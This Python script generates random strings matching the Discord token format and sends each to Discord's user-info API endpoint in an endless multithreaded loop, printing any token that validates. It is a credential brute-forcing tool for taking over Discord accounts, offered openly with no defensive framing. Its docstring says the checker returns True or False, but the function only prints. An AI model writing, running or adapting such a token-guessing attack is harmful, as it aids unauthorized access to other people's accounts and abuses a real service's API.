import random
import string
import requests
import concurrent.futures

def generate_random_string(template="MTMXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"):
    """
    Generates a random string by replacing 'X' in the provided template with random characters.

    Parameters:
        template (str): The string template where 'X' will be replaced with random characters.

    Returns:
        str: The generated random string based on the template.
    """
    allowed_symbols = string.ascii_letters + string.digits + "._"
    result = ''.join(random.choice(allowed_symbols) if char == 'X' else char for char in template)
    return result

def check_discord_token(token):
    """
    Checks if a generated Discord token is valid by making an API request using the requests library.
    
    Parameters:
        token (str): The Discord token to check.
    
    Returns:
        bool: True if the token is valid, False otherwise.
    """
    url = "https://discord.com/api/v10/users/@me"  # Endpoint to fetch the user's information
    
    headers = {
        "Authorization": token
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=5)  # Add timeout for faster response
        if response.status_code == 200:
            print(f"Valid Token: {token}")
        elif response.status_code == 401:
            print(f"Invalid Token: {token}")
        else:
            print(f"Error with Token: {token} (Status Code: {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"Error with Token: {token} ({e})")

def main():
    """
    Main function to generate random Discord bot tokens and check their validity indefinitely.
    """
    template = "MTMXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
    
    print("\nGenerating and checking Discord tokens concurrently:")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:  # Adjust number of threads
        while True:
            token = generate_random_string(template)
            executor.submit(check_discord_token, token)  # Submit the token check task to the thread pool

# Run the main function
if __name__ == "__main__":
    main()
